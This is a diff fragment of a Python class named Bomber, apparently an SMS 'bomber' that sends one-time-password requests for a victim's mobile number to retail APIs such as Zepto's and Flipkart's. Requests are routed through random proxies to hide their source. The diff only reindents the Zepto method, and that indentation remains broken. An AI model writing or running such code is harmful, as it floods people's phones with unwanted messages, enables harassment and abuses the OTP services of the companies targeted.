@@ -36,16 +36,16 @@ class Bomber:
 		return 'https://' + random.choice(proxylist)
 	
 	def zepto(self):
-	  url= "https://api.zepto.co.in/api/v1/user/customer/send-otp-sms/"
-	  zepto_header ={
-	    "Content-Type": "application/json"
-	  }
-	  try:
-	    request = requests.post(url, data = json.dumps( {"mobileNumber":+self.user_mobile}) , headers=zepto_header,proxies={ 'https' : self.getproxy()})
-    except:
-	     return False
- 	  if(request.status_code ==  200 ):
-			 return True
+	        url= "https://api.zepto.co.in/api/v1/user/customer/send-otp-sms/"
+	        zepto_header ={
+                "Content-Type": "application/json"
+	         }
+	        try:
+	             request = requests.post(url, data = json.dumps( {"mobileNumber":+self.user_mobile}) , headers=zepto_header,proxies={ 'https' : self.getproxy()})
+                except:
+   	             return False
+ 	        if(request.status_code ==  200 ):
+                     return True
 	
 	def flipkart(self):
 		url = "https://rome.api.flipkart.com/api/7/user/otp/generate"
